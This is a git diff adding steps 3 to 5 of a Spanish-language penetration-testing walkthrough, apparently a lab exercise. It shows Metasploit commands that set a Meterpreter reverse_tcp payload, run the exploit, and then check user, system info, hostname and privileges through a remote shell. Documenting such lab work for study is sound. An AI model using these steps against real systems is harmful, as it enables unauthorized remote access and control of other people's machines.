@@ -176,5 +176,68 @@ show options
 
 ## Paso 3 — Ejecución del Exploit (T1190 - Exploit Public-Facing Application)
 
-Como tuvimos 
+Como tuvimos problemas con el:
 
+```
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+```
+
+lo cambiaremos por el:
+
+```
+set PAYLOAD java/meterpreter/reverse_tcp
+```
+
+y correremos el programa con:
+
+```
+run
+```
+
+![RUN](https://res.cloudinary.com/dopcqb8wn/image/upload/v1786850244/RUN_tixloz.png)
+
+## Paso 4 — Identificar el Objetivo
+
+ejecutaremos los comando:
+
+```
+getuid
+
+sysinfo
+```
+
+Esto nos permitirá demostrar qué usuario y S.O. estamos controlando
+
+![GETUID](https://res.cloudinary.com/dopcqb8wn/image/upload/v1786850774/GETUID_brbcyj.png)
+
+## Paso 5 — Control de Objetivos Y Privilegios
+
+Teniendo el acceso por el meterpreter ejecutaremos el siguiente comando para ver el control del Objetivo:
+
+```
+shell
+```
+
+estando ya en el shell ejecutamos el comando:
+
+```
+whoami
+```
+
+y luego el comando:
+
+```
+hostname
+```
+
+Esto nos permitirá demostrar qué tenemos el control del objetivo
+
+![CONTROL 1](https://res.cloudinary.com/dopcqb8wn/image/upload/v1786851546/CONTROL_1_hjvb8m.png)
+
+De la misma manera verificaremos los privilegios:
+
+repetimos los comando "shell" y "whoami /priv"
+
+obtenemos este resultado:
+
+![CONTROL 2](https://res.cloudinary.com/dopcqb8wn/image/upload/v1786851693/CONTROL_2_noqxwo.png)
